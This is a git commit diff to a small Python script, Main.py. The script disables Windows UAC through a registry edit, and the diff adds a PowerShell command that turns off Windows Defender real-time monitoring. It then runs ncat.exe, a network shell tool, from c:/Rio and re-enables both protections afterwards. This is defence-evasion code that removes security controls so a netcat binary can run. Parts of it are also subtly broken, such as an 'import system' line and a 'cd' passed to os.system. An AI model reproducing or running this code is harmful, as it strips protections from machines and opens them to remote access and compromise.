147d60ecbc650f1aa1f6311140544eb0b85cb48e
shifty189 <shifty189@gmail.com>
2020-06-11 14:45:06 -0400

    Update Main.py

--- Main.py
+++ Main.py
@@ -3,11 +3,16 @@
 
 import os
 import system
+import sys
+import subprocess
 
-#Turn off UAC
+#Turn off UAC and windows defender
 os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
+p = subprocess.Popen(["powershell.exe", "Set-MpPreference -DisableRealtimeMonitoring $true"], stdout=sys.stdout)
+
 os.system("cd c:/Rio")
 os.system("ncat.exe")
 
-#turn UAC back on
+#turn UAC and windows defender back on
+p = subprocess.Popen(["powershell.exe", "Set-MpPreference -DisableRealtimeMonitoring $false"], stdout=sys.stdout)
 os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f")
